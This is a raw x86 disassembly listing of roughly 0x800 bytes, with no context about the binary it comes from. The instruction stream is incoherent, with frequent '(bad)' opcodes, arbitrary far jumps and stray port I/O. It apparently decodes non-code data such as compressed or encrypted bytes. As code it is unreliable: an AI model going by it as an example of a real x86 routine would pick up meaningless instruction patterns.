  415a8e:	jo     0x415a3b
  415a90:	sub    BYTE PTR [ebp+0x4e],dh
  415a93:	sub    ah,cl
  415a95:	push   esi
  415a96:	lahf   
  415a97:	jmp    0x779196d2
  415a9c:	fwait
  415a9d:	push   edx
  415a9e:	aad    0x6e
  415aa0:	cmp    BYTE PTR [esi-0x396c7546],dl
  415aa6:	push   ebx
  415aa7:	int    0x47
  415aa9:	mov    ebx,0x58508234
  415aae:	js     0x415acc
  415ab0:	daa    
  415ab1:	and    BYTE PTR [edx+0x74],al
  415ab4:	push   0xfffffff9
  415ab6:	mov    ?,WORD PTR [eax+0x5e6e2f57]
  415abc:	xchg   ebp,eax
  415abd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415abe:	inc    ecx
  415abf:	aaa    
  415ac0:	and    dh,BYTE PTR [edi+0x19]
  415ac3:	mov    gs,WORD PTR ds:0xd5adbb14
  415ac9:	call   DWORD PTR [edx+0x2f]
  415acc:	cmp    BYTE PTR [ebx-0x2e],ch
  415acf:	mov    eax,ds:0x345e2ad
  415ad4:	retf   
  415ad5:	push   edi
  415ad6:	mov    ebx,0x168598cc
  415adb:	cmc    
  415adc:	push   ecx
  415add:	lock or BYTE PTR [edi],cl
  415ae0:	(bad)  
  415ae1:	jnp    0x415aa1
  415ae3:	inc    esi
  415ae4:	xor    esi,ebx
  415ae6:	outs   dx,BYTE PTR ds:[esi]
  415ae7:	sar    esp,cl
  415ae9:	and    al,0xfd
  415aeb:	pop    esp
  415aec:	mov    cl,0x48
  415aee:	xor    DWORD PTR [ecx-0x62],ebx
  415af1:	jmp    0xb71a:0xd17fa75b
  415af8:	fwait
  415af9:	outs   dx,DWORD PTR ds:[esi]
  415afa:	stc    
  415afb:	aam    0xe4
  415afd:	sbb    al,0x4e
  415aff:	push   0x49
  415b01:	sbb    bh,al
  415b03:	rcr    BYTE PTR [eax+0x7c80db3b],0x24
  415b0a:	loop   0x415ac2
  415b0c:	mov    al,0xe5
  415b0e:	fucomp st(1)
  415b10:	pop    edi
  415b11:	stc    
  415b12:	or     bh,BYTE PTR [ebp+0x49]
  415b15:	je     0x415aa3
  415b17:	xchg   ebp,eax
  415b18:	xchg   ebx,eax
  415b19:	inc    ebx
  415b1a:	dec    eax
  415b1b:	js     0x415b0b
  415b1d:	sbb    BYTE PTR [esi],bl
  415b1f:	pop    ecx
  415b20:	dec    ebx
  415b21:	push   0x48eb727d
  415b26:	ret    0xe1b8
  415b29:	fiadd  DWORD PTR [eax]
  415b2b:	dec    edi
  415b2c:	pushf  
  415b2d:	dec    edx
  415b2e:	out    0xa3,al
  415b30:	or     edi,edx
  415b32:	mov    ebp,0x21c63a1c
  415b37:	xchg   ecx,eax
  415b38:	ja     0x415adb
  415b3a:	xchg   edi,eax
  415b3b:	mov    ebx,0xb195
  415b40:	add    BYTE PTR [eax],al
  415b42:	rcl    BYTE PTR [esi],0x80
  415b45:	pop    ebx
  415b46:	(bad)  
  415b47:	(bad)  
  415b49:	lahf   
  415b4a:	jg     0x415ae1
  415b4c:	fdivr  QWORD PTR gs:[ebx-0x3d]
  415b50:	add    edi,esp
  415b52:	ins    DWORD PTR es:[edi],dx
  415b53:	fld    DWORD PTR [eax]
  415b55:	add    ah,dh
  415b57:	add    al,0x0
  415b59:	add    BYTE PTR [edx-0x37],bl
  415b5c:	or     dl,ah
  415b5e:	dec    eax
  415b5f:	mov    ebp,0x2dc48694
  415b64:	sub    al,0xfc
  415b66:	xor    BYTE PTR [ecx-0x74],0xac
  415b6a:	sbb    bh,BYTE PTR [eax+0x45]
  415b6d:	loop   0x415bc1
  415b6f:	cmp    bh,dh
  415b71:	or     bh,cl
  415b73:	stos   BYTE PTR es:[edi],al
  415b74:	aam    0xd1
  415b76:	fwait
  415b77:	dec    ecx
  415b78:	inc    di
  415b7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b7b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415b7d:	enter  0x3045,0x40
  415b81:	sbb    cl,al
  415b83:	shl    DWORD PTR [ecx+0x4fb8344b],1
  415b89:	fs in  al,dx
  415b8b:	xor    dl,BYTE PTR cs:[eax]
  415b8e:	out    dx,al
  415b8f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b91:	mov    esp,0xf8d34f80
  415b96:	fimul  WORD PTR [edx-0x46caf7e5]
  415b9c:	pusha  
  415b9d:	cwde   
  415b9e:	loopne 0x415b67
  415ba0:	das    
  415ba1:	push   edx
  415ba2:	push   esp
  415ba3:	fucomip st,st(4)
  415ba5:	jmpw   0x18cc
  415ba9:	push   esp
  415baa:	(bad)  
  415bab:	or     edx,DWORD PTR [edi+0x5e]
  415bae:	aam    0x90
  415bb0:	sbb    BYTE PTR [ebp+0x2f],al
  415bb3:	stos   BYTE PTR es:[edi],al
  415bb4:	pop    ecx
  415bb5:	arpl   ax,bx
  415bb7:	jae    0x415bd3
  415bb9:	jmp    0xa667:0x5f519b9
  415bc0:	cmp    al,0xa
  415bc2:	pop    ebp
  415bc3:	pop    eax
  415bc4:	loop   0x415bf1
  415bc6:	push   esp
  415bc7:	scas   eax,DWORD PTR es:[edi]
  415bc8:	xchg   ecx,eax
  415bc9:	(bad)  
  415bca:	xor    ch,BYTE PTR [ecx+0x310f34fd]
  415bd0:	fwait
  415bd1:	xchg   DWORD PTR [ecx-0x24d9527a],ebp
  415bd7:	mov    bh,0xe8
  415bd9:	repnz mov WORD PTR ds:0xf052a20e,cs
  415be0:	ret    0x2bb7
  415be3:	mov    ?,WORD PTR [esi+0x4d]
  415be6:	add    eax,0x44be748f
  415beb:	fsub   DWORD PTR [edx-0x7c5895db]
  415bf1:	sbb    cl,BYTE PTR [edi+0x79392318]
  415bf7:	mov    WORD PTR [edx-0x7c],?
  415bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bfb:	cld    
  415bfc:	shl    BYTE PTR [eax-0x1b],cl
  415bff:	es adc dl,ch
  415c02:	aas    
  415c03:	cmc    
  415c04:	mov    ecx,0x15eba51f
  415c09:	mov    edi,0xc9965a9b
  415c0e:	mov    dl,0x12
  415c10:	stos   DWORD PTR es:[edi],eax
  415c11:	out    dx,al
  415c12:	push   es
  415c13:	in     al,0x6c
  415c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c16:	je     0x415c5c
  415c18:	push   ebp
  415c19:	mov    ebp,ebp
  415c1b:	inc    eax
  415c1c:	jb     0x415c2d
  415c1e:	push   ss
  415c1f:	mov    bl,0x74
  415c21:	xlat   BYTE PTR ds:[ebx]
  415c22:	xor    ebp,DWORD PTR [eax-0x7]
  415c25:	push   es
  415c26:	adc    BYTE PTR [esi+0x78],ch
  415c29:	jae    0x415c38
  415c2b:	data16 data16 jb 0x415c26
  415c2f:	pop    edx
  415c30:	mov    dl,BYTE PTR [ebx+0x66]
  415c33:	jmp    0x415c21
  415c35:	lds    esi,FWORD PTR [edi]
  415c37:	inc    esp
  415c38:	xor    eax,0x9f0f11b2
  415c3d:	addr16 fcmove st,st(4)
  415c40:	ja     0x415cb1
  415c42:	test   eax,0xaee6b39f
  415c47:	jecxz  0x415cb1
  415c49:	mov    dh,0xb9
  415c4b:	mov    al,ds:0xe55ace45
  415c50:	push   ecx
  415c51:	rcl    DWORD PTR [ebp+0x6f],0x3e
  415c55:	js     0x415cad
  415c57:	sbb    al,0xec
  415c59:	xor    eax,0xdc36c434
  415c5e:	inc    ecx
  415c5f:	dec    edx
  415c60:	xor    ecx,DWORD PTR [esi-0x6a5faccf]
  415c66:	inc    eax
  415c67:	shl    DWORD PTR [edx+ebx*8],cl
  415c6a:	sbb    ebx,DWORD PTR [eax+0x2c40b99c]
  415c70:	out    0xbd,eax
  415c72:	les    esi,FWORD PTR ds:[ebp+0x4d]
  415c76:	pop    eax
  415c77:	sbb    BYTE PTR [eax+ebx*2],al
  415c7a:	jns    0x415c98
  415c7c:	sti    
  415c7d:	pop    edi
  415c7e:	or     al,0x13
  415c80:	loope  0x415cbc
  415c82:	mov    edx,0x7ed59ae2
  415c87:	cmp    eax,0x6747222a
  415c8c:	xor    esp,esi
  415c8e:	add    al,0x7a
  415c90:	sub    ah,BYTE PTR [ebx-0x1f]
  415c93:	psubsw mm3,mm4
  415c96:	js     0x415cb8
  415c98:	mov    bl,0x73
  415c9a:	dec    BYTE PTR [edx]
  415c9c:	out    dx,al
  415c9d:	mov    bl,0x4e
  415c9f:	inc    ebx
  415ca0:	xchg   edx,eax
  415ca1:	xchg   BYTE PTR [ecx+0x273bb08],dh
  415ca7:	pusha  
  415ca8:	ret    0x98d9
  415cab:	retf   0x14e3
  415cae:	jns    0x415d1b
  415cb0:	adc    eax,0x37e6b91
  415cb5:	jmp    0x415cd7
  415cb7:	bnd ret 
  415cb9:	and    DWORD PTR [edx-0x6333a493],ecx
  415cbf:	pop    ecx
  415cc0:	mov    ah,0xbe
  415cc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cc3:	ds xchg esi,eax
  415cc5:	ret    0x26b3
  415cc8:	jae    0x415c8c
  415cca:	jbe    0x415c65
  415ccc:	xchg   ebx,eax
  415ccd:	sbb    edi,DWORD PTR [ebx-0xa]
  415cd0:	mov    esp,esi
  415cd2:	sbb    ah,al
  415cd4:	cld    
  415cd5:	pop    ecx
  415cd6:	xor    eax,0xcf6e9945
  415cdb:	loop   0x415d0d
  415cdd:	retf   
  415cde:	push   ebx
  415cdf:	int3   
  415ce0:	int3   
  415ce1:	rcl    DWORD PTR [edi+0x1a],1
  415ce4:	pop    eax
  415ce5:	jo     0x415c98
  415ce7:	shl    DWORD PTR [ebx+0x2dc225b1],0x61
  415cee:	xor    al,0x2c
  415cf0:	arpl   WORD PTR [ebx],cx
  415cf2:	cs sbb eax,ebp
  415cf5:	lock sbb edx,ebx
  415cf8:	fst    DWORD PTR [esi+0x4c]
  415cfb:	dec    edx
  415cfc:	jl     0x415cdf
  415cfe:	mov    ah,BYTE PTR [eax]
  415d00:	mov    ch,0x58
  415d02:	enter  0x1f68,0x2a
  415d06:	mov    dh,0x4
  415d08:	inc    ebx
  415d09:	mov    cl,0xd1
  415d0b:	and    esi,DWORD PTR [edx]
  415d0d:	test   DWORD PTR [ebp+eiz*4+0x33],edx
  415d11:	add    eax,ebx
  415d13:	mov    ebx,DWORD PTR [edx]
  415d15:	out    dx,eax
  415d16:	push   DWORD PTR [edi+esi*4]
  415d19:	test   BYTE PTR [ebx+ecx*8],cl
  415d1c:	push   edi
  415d1d:	adc    eax,0x4eb9f9e8
  415d22:	gs sub eax,0x1d657d89
  415d28:	outs   dx,DWORD PTR ds:[esi]
  415d29:	pop    ss
  415d2a:	cli    
  415d2b:	fwait
  415d2c:	test   DWORD PTR [esi],esi
  415d2e:	mov    ebx,0x46c2859f
  415d33:	xor    eax,0x93a140d6
  415d38:	xor    ebx,DWORD PTR [eax+0x1aca8746]
  415d3e:	push   ss
  415d3f:	lods   al,BYTE PTR ds:[esi]
  415d40:	ret    0xe3f4
  415d43:	and    eax,0x104228e8
  415d48:	repnz stos BYTE PTR es:[edi],al
  415d4a:	xchg   ebp,eax
  415d4b:	arpl   WORD PTR [ebp+0x5f658559],bp
  415d51:	xor    DWORD PTR [edx+edx*1-0x7b40471d],ebx
  415d58:	addr16 (bad) 
  415d5a:	fidiv  DWORD PTR [ebp+ecx*2-0xd]
  415d5e:	cli    
  415d5f:	enter  0x6c8f,0x8d
  415d63:	sub    al,0x98
  415d65:	scas   al,BYTE PTR es:[edi]
  415d66:	mov    dh,0x2a
  415d68:	stos   DWORD PTR es:[edi],eax
  415d69:	adc    dl,BYTE PTR [edx-0x4922450e]
  415d6f:	and    edx,DWORD PTR [eax-0x31]
  415d72:	std    
  415d73:	pop    ebp
  415d74:	mov    dh,0x7a
  415d76:	xchg   esp,eax
  415d77:	add    ecx,ecx
  415d79:	mov    edx,DWORD PTR [esi-0x45]
  415d7c:	ins    DWORD PTR es:[edi],dx
  415d7d:	push   es
  415d7e:	(bad)  
  415d7f:	call   0x7fb0bdef
  415d84:	xor    DWORD PTR [ebx+0x16a29d05],0xfb90a441
  415d8e:	xor    al,ah
  415d90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d91:	jbe    0x415e11
  415d93:	or     BYTE PTR [esi+0x72],cl
  415d96:	inc    esp
  415d97:	repz fs pushf 
  415d9a:	rcl    BYTE PTR [eax],cl
  415d9c:	xor    eax,0xa6e67e20
  415da1:	cs push 0x39561e08
  415da7:	push   ebp
  415da8:	loope  0x415d31
  415daa:	jns    0x415e22
  415dac:	xchg   esi,eax
  415dad:	adc    eax,0x655734cd
  415db2:	lock mov DWORD PTR [edx-0x22923f2f],edx
  415db9:	sahf   
  415dba:	xchg   ebx,eax
  415dbb:	les    ebp,FWORD PTR ds:0xa566f0e5
  415dc1:	imul   ch
  415dc3:	or     al,0x19
  415dc5:	dec    ecx
  415dc6:	xor    esi,0xffffff86
  415dc9:	sub    esp,esp
  415dcb:	jne    0x415da8
  415dcd:	sub    eax,0xab4ae9a1
  415dd2:	arpl   bp,bx
  415dd4:	mov    ds:0xff7773e1,al
  415dd9:	ja     0x415d86
  415ddb:	adc    ah,bh
  415ddd:	pop    eax
  415dde:	inc    edx
  415ddf:	shl    ebx,cl
  415de1:	cmp    DWORD PTR [ecx+0x5d1bc332],ecx
  415de7:	xchg   ecx,eax
  415de8:	iret   
  415de9:	push   0x8fce5aa6
  415dee:	xchg   esi,eax
  415def:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415df0:	push   esi
  415df1:	xchg   esp,eax
  415df2:	jmp    0x415e19
  415df4:	(bad)  
  415df5:	iret   
  415df6:	jmp    0x415e43
  415df8:	mov    edx,0x8e0d1e13
  415dfd:	sahf   
  415dfe:	mov    al,ds:0xdbe4314c
  415e03:	mov    esi,0x2b9cd422
  415e08:	inc    edx
  415e09:	and    bh,dl
  415e0b:	outs   dx,BYTE PTR ds:[esi]
  415e0c:	pop    ds
  415e0d:	jno    0x415e1e
  415e0f:	leave  
  415e10:	cmp    BYTE PTR [edi+0x49d42b02],bh
  415e16:	and    eax,0x5c7ef9fa
  415e1b:	fidivr WORD PTR [edi]
  415e1d:	xchg   ebx,eax
  415e1e:	push   ss
  415e1f:	sbb    eax,0x296c5c3c
  415e24:	push   cs
  415e25:	xchg   BYTE PTR [esi],ah
  415e27:	mov    ecx,0x5e482a0a
  415e2c:	mov    eax,0xf4b29cca
  415e31:	mov    bl,0x1b
  415e33:	cld    
  415e34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e35:	push   ecx
  415e36:	push   ds
  415e37:	mov    bl,BYTE PTR [ecx+0x4f]
  415e3a:	mov    ecx,0xc953e744
  415e3f:	sbb    al,0x19
  415e41:	dec    eax
  415e42:	jns    0x415df3
  415e44:	jns    0x415e57
  415e46:	push   ss
  415e47:	in     al,dx
  415e48:	fidiv  DWORD PTR [eax]
  415e4a:	mov    al,0x8c
  415e4c:	pushf  
  415e4d:	dec    edi
  415e4e:	pop    ebp
  415e4f:	jecxz  0x415de3
  415e51:	adc    edi,DWORD PTR [esi]
  415e53:	add    BYTE PTR [esi+0x53],cl
  415e56:	fdivr  DWORD PTR [ebx+0x62]
  415e59:	add    BYTE PTR [edi],bl
  415e5b:	clc    
  415e5c:	stc    
  415e5d:	and    ebp,DWORD PTR [edx]
  415e5f:	pop    ss
  415e60:	cs lahf 
  415e62:	fstp   QWORD PTR [ebp+0x3c1f2506]
  415e68:	sahf   
  415e69:	jo     0x415e71
  415e6b:	imul   DWORD PTR [esi+0x5c]
  415e6e:	add    ebx,DWORD PTR [ebx+edx*2+0x5b]
  415e72:	dec    ecx
  415e73:	rol    BYTE PTR ds:0xb9bd4b49,1
  415e79:	or     eax,0x1ff70bdd
  415e7e:	es jae 0x415e54
  415e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e82:	js     0x415eb2
  415e84:	(bad)  
  415e85:	outs   dx,BYTE PTR ds:[esi]
  415e86:	pop    ds
  415e87:	push   cs
  415e88:	inc    eax
  415e89:	dec    ecx
  415e8a:	adc    dh,bh
  415e8c:	lea    ecx,[bp+di-0x36]
  415e90:	sbb    DWORD PTR [edx+0x5e2a1f0a],edi
  415e96:	add    eax,0x8578bf37
  415e9b:	mov    ds:0x6793e2fd,eax
  415ea0:	daa    
  415ea1:	aam    0x5b
  415ea3:	fild   DWORD PTR [ebx]
  415ea5:	add    BYTE PTR [edx],cl
  415ea7:	aad    0x2
  415ea9:	sbb    DWORD PTR [edx+0x679dce7e],eax
  415eaf:	sbb    al,BYTE PTR [ecx+0x6c8811b2]
  415eb5:	add    al,0xf0
  415eb7:	loop   0x415ebf
  415eb9:	pop    ecx
  415eba:	stos   DWORD PTR es:[edi],eax
  415ebb:	mov    ch,0xe8
  415ebd:	adc    ebx,DWORD PTR [ebx-0x6b]
  415ec0:	xchg   edi,eax
  415ec1:	mov    ebp,0x7d8db2cf
  415ec6:	xor    ax,0x9697
  415eca:	inc    edx
  415ecb:	cli    
  415ecc:	add    eax,0x7ed2d2f1
  415ed1:	repnz sbb esi,DWORD PTR [ebx]
  415ed4:	fstp   TBYTE PTR [ecx-0x62687f49]
  415eda:	aas    
  415edb:	fistp  QWORD PTR [ebp-0x53]
  415ede:	or     al,0x56
  415ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ee1:	sahf   
  415ee2:	iret   
  415ee3:	add    BYTE PTR [edx+0x73b25d27],ch
  415ee9:	jbe    0x415f2a
  415eeb:	and    DWORD PTR [esi],ebx
  415eed:	loop   0x415ed7
  415eef:	adc    edi,DWORD PTR [ebx]
  415ef1:	leave  
  415ef2:	ja     0x415ed8
  415ef4:	xchg   DWORD PTR [esi-0x269cd5fc],edx
  415efa:	add    cl,BYTE PTR [ebp-0x3a]
  415efd:	xlat   BYTE PTR ds:[ebx]
  415efe:	std    
  415eff:	not    DWORD PTR [edx+0x7c]
  415f02:	jo     0x415f37
  415f04:	xchg   edi,eax
  415f05:	out    dx,eax
  415f06:	daa    
  415f07:	sub    dl,BYTE PTR [edx]
  415f09:	inc    eax
  415f0a:	push   esp
  415f0b:	test   al,0xcd
  415f0d:	xor    BYTE PTR [ecx],ah
  415f0f:	lods   al,BYTE PTR ds:[esi]
  415f10:	cmp    BYTE PTR [edi+0x482ab979],cl
  415f16:	sahf   
  415f17:	xlat   BYTE PTR ds:[ebx]
  415f18:	in     eax,dx
  415f19:	add    eax,0xd894c3be
  415f1e:	sub    ch,BYTE PTR [esi+0x6aa62da9]
  415f24:	sub    esp,edx
  415f26:	inc    esp
  415f27:	aam    0x85
  415f29:	push   ds
  415f2a:	inc    edx
  415f2b:	or     BYTE PTR [esi+0x509fa501],0xc8
  415f32:	jae    0x415f68
  415f34:	scas   eax,DWORD PTR es:[edi]
  415f35:	pop    es
  415f36:	sub    al,0xb4
  415f38:	std    
  415f39:	rcl    DWORD PTR [ecx+ecx*4+0x4c],cl
  415f3d:	adc    al,0x6d
  415f3f:	in     al,dx
  415f40:	xchg   ecx,eax
  415f41:	repnz sbb BYTE PTR [ecx+edx*1+0x2b8dd438],0xdc
  415f4a:	xor    eax,0x7375d126
  415f4f:	pusha  
  415f50:	outs   dx,BYTE PTR ds:[esi]
  415f51:	scas   al,BYTE PTR es:[edi]
  415f52:	adc    DWORD PTR [ebp-0x49364f98],ebp
  415f58:	jno    0x415eff
  415f5a:	xor    ebx,DWORD PTR [ecx]
  415f5c:	xor    eax,0xd861cf9e
  415f61:	mov    DWORD PTR [esi+0x2f],ecx
  415f64:	jbe    0x415f4a
  415f66:	stos   DWORD PTR es:[edi],eax
  415f67:	and    BYTE PTR [esi+0x2d],bl
  415f6a:	pop    ss
  415f6b:	inc    edi
  415f6c:	pop    ds
  415f6d:	test   DWORD PTR ds:0xfd2963b9,ecx
  415f73:	add    al,0x85
  415f75:	sub    ch,BYTE PTR [edi-0x14]
  415f78:	dec    esi
  415f79:	xchg   DWORD PTR ds:0x314edf5c,edi
  415f7f:	fs std 
  415f81:	inc    ebx
  415f82:	xchg   ecx,eax
  415f83:	jo     0x415f94
  415f85:	stos   BYTE PTR es:[edi],al
  415f86:	scas   al,BYTE PTR es:[edi]
  415f87:	clc    
  415f88:	mov    bl,ah
  415f8a:	call   0xf569:0x5d14ba31
  415f91:	or     DWORD PTR [ecx-0x2495a0a7],eax
  415f97:	jmp    0x153:0xf4f19242
  415f9e:	mov    ds:0x4de012,eax
  415fa3:	std    
  415fa4:	(bad)  
  415fa5:	call   0xec54107b
  415faa:	leave  
  415fab:	pushw  0x75
  415fae:	div    esi
  415fb0:	push   ecx
  415fb1:	into   
  415fb2:	jnp    0x415fb7
  415fb4:	rol    bl,1
  415fb6:	inc    edx
  415fb7:	sbb    bh,BYTE PTR [edi]
  415fb9:	inc    ebx
  415fba:	xchg   BYTE PTR [ebx+esi*2-0x44],dl
  415fbe:	adc    al,0xf5
  415fc0:	test   DWORD PTR [edi-0x10cd85a5],0x195614e2
  415fca:	sbb    al,0x39
  415fcc:	int    0x4
  415fce:	or     al,0x73
  415fd0:	xlat   BYTE PTR ds:[ebx]
  415fd1:	lock out 0xe8,al
  415fd4:	or     eax,0x335518dd
  415fd9:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  415fdb:	xlat   BYTE PTR ds:[ebx]
  415fdc:	cmp    eax,0xe77a63bc
  415fe1:	and    al,0xb3
  415fe3:	pop    es
  415fe4:	daa    
  415fe5:	lahf   
  415fe6:	or     eax,0xc1185469
  415feb:	outs   dx,BYTE PTR ds:[esi]
  415fec:	push   esp
  415fed:	pushf  
  415fee:	ins    DWORD PTR es:[edi],dx
  415fef:	or     DWORD PTR [ecx+0x23],esi
  415ff2:	aam    0xfc
  415ff4:	adc    BYTE PTR [edx],ah
  415ff6:	test   DWORD PTR [edi-0x1669be68],esi
  415ffc:	xlat   BYTE PTR ds:[ebx]
  415ffd:	push   ds
  415ffe:	push   ebx
  415fff:	mov    eax,0xe69cccec
  416004:	adc    DWORD PTR [esi-0x4b],eax
  416007:	call   0x32aebfe
  41600c:	mov    bl,0x50
  41600e:	jmp    0xf9aee673
  416013:	je     0x416019
  416015:	fld    TBYTE PTR [esi]
  416017:	aad    0xa8
  416019:	mov    esi,0xad223e53
  41601e:	mov    eax,ds:0xdd32ce61
  416023:	sbb    ch,0x91
  416026:	lahf   
  416027:	sbb    eax,0x70e65c57
  41602c:	pop    esp
  41602d:	pop    ebx
  41602e:	loope  0x416009
  416030:	pop    ax
  416032:	ss or  bl,dl
  416035:	or     ch,BYTE PTR [ebx+ebp*8]
  416038:	fisttp DWORD PTR [ebp-0xd]
  41603b:	xchg   esi,eax
  41603c:	mov    ch,BYTE PTR [esi]
  41603e:	push   0x1c4814cd
  416043:	popa   
  416044:	xchg   edx,eax
  416045:	cmp    dl,BYTE PTR [eax-0x507d8c77]
  41604b:	mov    ds:0x7705,al
  416050:	add    BYTE PTR [eax],al
  416052:	cmp    dh,BYTE PTR [ebp+0x3c]
  416055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416056:	jg     0x416047
  416058:	mov    edx,0xd72f5cfd
  41605d:	jae    0x415fff
  41605f:	dec    edx
  416060:	pop    esi
  416061:	xchg   BYTE PTR [ecx-0x22],ah
  416064:	add    BYTE PTR [eax],al
  416066:	hlt    
  416067:	add    al,0x0
  416069:	add    BYTE PTR [esi+0x67],cl
  41606c:	jno    0x4160bc
  41606e:	xlat   BYTE PTR ds:[ebx]
  41606f:	pop    esp
  416070:	mov    WORD PTR ds:0xcd3d5828,ds
  416076:	sub    DWORD PTR [ebp+0x1a5a5a44],0xffffffa9
  41607d:	or     DWORD PTR [edx],0xaa23bf42
  416083:	lock daa 
  416085:	out    dx,eax
  416086:	fstp   TBYTE PTR [edx+eax*2-0x50]
  41608a:	jl     0x4160a5
  41608c:	ja     0x416050
  41608e:	imul   edx,DWORD PTR [esi-0x2eaf40cd],0x9f51ed0c
  416098:	cmp    bl,dh
  41609a:	ret    0x4955
  41609d:	fmul   st,st(3)
  41609f:	jmp    0x52453a18
  4160a4:	jo     0x4160ab
  4160a6:	fnstsw WORD PTR [edi-0x2289fdab]
  4160ac:	jmp    0x8ef8:0x67494860
  4160b3:	inc    edi
  4160b4:	mov    bl,0xdd
  4160b6:	push   es
  4160b7:	ss inc esi
  4160b9:	push   ebx
  4160ba:	cmp    dl,bl
  4160bc:	pop    eax
  4160bd:	cdq    
  4160be:	pop    eax
  4160bf:	adc    bh,BYTE PTR [esi+edx*1-0x59]
  4160c3:	addr16 xchg ebx,eax
  4160c5:	loope  0x41604b
  4160c7:	adc    al,al
  4160c9:	jnp    0x416134
  4160cb:	or     al,BYTE PTR [edx+0x1f]
  4160ce:	(bad)  
  4160d0:	scas   eax,DWORD PTR es:[edi]
  4160d1:	cs pop esp
  4160d3:	dec    edi
  4160d4:	je     0x416082
  4160d6:	and    eax,0xdd075e0d
  4160db:	adc    bh,BYTE PTR [edx+0x47]
  4160de:	retf   
  4160df:	mov    dl,0x13
  4160e1:	pop    ds
  4160e2:	push   es
  4160e3:	pushf  
  4160e4:	int3   
  4160e5:	push   esi
  4160e6:	pop    ss
  4160e7:	adc    DWORD PTR [ebx+ecx*2+0x5a6cb4ed],0xfa713da6
  4160f2:	xchg   edx,eax
  4160f3:	push   DWORD PTR [edx-0x182e6d08]
  4160f9:	inc    ebp
  4160fa:	cmp    al,0x40
  4160fc:	int3   
  4160fd:	mov    ecx,0x3ad75fd6
  416102:	popf   
  416103:	in     al,dx
  416104:	in     eax,dx
  416105:	aas    
  416106:	pop    ss
  416107:	mov    al,0x26
  416109:	fwait
  41610a:	mov    ebx,0x470ff9f2
  41610f:	sbb    DWORD PTR [ecx+0x6c],eax
  416112:	add    BYTE PTR [eax],al
  416114:	repnz pop es
  416116:	xchg   edi,eax
  416117:	arpl   WORD PTR [edx+ebp*1+0x64],ax
  41611b:	(bad)  
  41611c:	sar    eax,1
  41611e:	out    dx,eax
  41611f:	es push esp
  416121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416122:	or     DWORD PTR [eax*8-0x1dff30ca],edi
  416129:	dec    esp
  41612a:	sub    al,0x26
  41612c:	(bad)  
  41612d:	jnp    0x41618a
  41612f:	mov    edx,0xb7b4e46f
  416134:	dec    ebp
  416135:	out    dx,eax
  416136:	pop    ecx
  416137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416138:	mov    BYTE PTR [edi-0xa],0x4e
  41613c:	retf   0xebb7
  41613f:	push   0x3664c261
  416144:	or     BYTE PTR [ebp-0x2d],dl
  416147:	or     al,0xb
  416149:	xchg   ebx,eax
  41614a:	pop    edi
  41614b:	dec    edx
  41614c:	add    bh,BYTE PTR [esi+esi*8-0x524bf147]
  416153:	imul   ebx,edx,0xd
  416156:	push   edi
  416157:	pop    esi
  416158:	cwde   
  416159:	loopne 0x41611c
  41615b:	in     eax,dx
  41615c:	fldenv [ecx]
  41615e:	idiv   DWORD PTR [ecx]
  416160:	xor    esp,DWORD PTR [esi-0x19]
  416163:	ret    0x27c6
  416166:	add    eax,DWORD PTR [eax-0x2]
  416169:	sub    eax,0xbbeb59f3
  41616e:	out    0x55,al
  416170:	sbb    eax,0x17b7ee97
  416175:	push   0x13d21452
  41617a:	cmc    
  41617b:	xchg   edx,eax
  41617c:	jmp    0x4161de
  41617e:	sub    BYTE PTR [edx],0x6e
  416181:	out    0x54,eax
  416183:	jno    0x4161ab
  416185:	dec    edi
  416186:	sbb    eax,eax
  416188:	xor    BYTE PTR [eax-0x16],ch
  41618b:	dec    edi
  41618c:	fimul  DWORD PTR [edi]
  41618e:	inc    edi
  41618f:	adc    al,0xeb
  416191:	das    
  416192:	test   eax,0xfe3136b
  416197:	jg     0x41620c
  416199:	jns    0x4161f8
  41619b:	daa    
  41619c:	ds inc eax
  41619e:	jb     0x416203
  4161a0:	in     al,0xdd
  4161a2:	xor    BYTE PTR [edi+edx*1+0x5010d3e0],bh
  4161a9:	mov    cl,0x1f
  4161ab:	pop    es
  4161ac:	jae    0x416145
  4161ae:	or     ecx,DWORD PTR [edx-0x6758486a]
  4161b4:	loop   0x416146
  4161b6:	and    al,0x8a
  4161b8:	ss adc ebx,edx
  4161bb:	inc    esp
  4161bc:	push   esp
  4161bd:	push   ds
  4161be:	mov    edi,0x625b9577
  4161c3:	and    al,0xa9
  4161c5:	and    al,0x20
  4161c7:	xchg   edx,eax
  4161c8:	push   es
  4161c9:	and    eax,0x46a476f2
  4161ce:	or     eax,0x97fc3731
  4161d3:	lods   eax,DWORD PTR ds:[esi]
  4161d4:	fdivr  QWORD PTR [ebp-0x6732823b]
  4161da:	mov    BYTE PTR [edi+0x713938bc],ah
  4161e0:	jnp    0x41624c
  4161e2:	inc    esp
  4161e3:	xor    BYTE PTR [edx+0x2a],bh
  4161e6:	jecxz  0x4161a6
  4161e8:	div    DWORD PTR [esi+edi*8-0x2f8a7837]
  4161ef:	aad    0x6e
  4161f1:	(bad)  
  4161f2:	push   0x13c5a6d
  4161f7:	xor    ebp,DWORD PTR [eax-0x48]
  4161fa:	inc    esp
  4161fb:	hlt    
  4161fc:	leave  
  4161fd:	xchg   edi,eax
  4161fe:	sub    BYTE PTR [eax+ecx*2+0x27bf62c6],cl
  416205:	adc    DWORD PTR [esi+0x23],edi
  416208:	das    
  416209:	mov    dh,0xa
  41620b:	out    dx,eax
  41620c:	mov    ah,dh
  41620e:	pop    esp
  41620f:	sbb    DWORD PTR [ebx],ecx
  416211:	or     DWORD PTR [edi-0x1879eed0],ebp
  416217:	dec    edi
  416218:	mov    esi,0x80e08cea
